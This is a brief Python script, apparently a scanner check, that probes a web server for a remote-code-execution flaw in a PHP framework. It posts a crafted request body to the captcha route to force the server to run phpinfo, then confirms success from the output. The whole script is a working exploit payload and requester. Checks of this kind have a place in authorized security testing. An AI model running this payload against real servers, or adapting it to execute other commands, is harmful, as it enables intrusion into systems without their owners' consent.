#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests


def verify(url):
    flag = 'PHP Extension Build'
    data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

    payloads = [
        r"/index.php?s=captcha"
    ]
    for payload in payloads:
        vul_url = url + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        r = requests.post(vul_url, data=data, headers=headers)

        if flag in r.text:
            return True
    return False
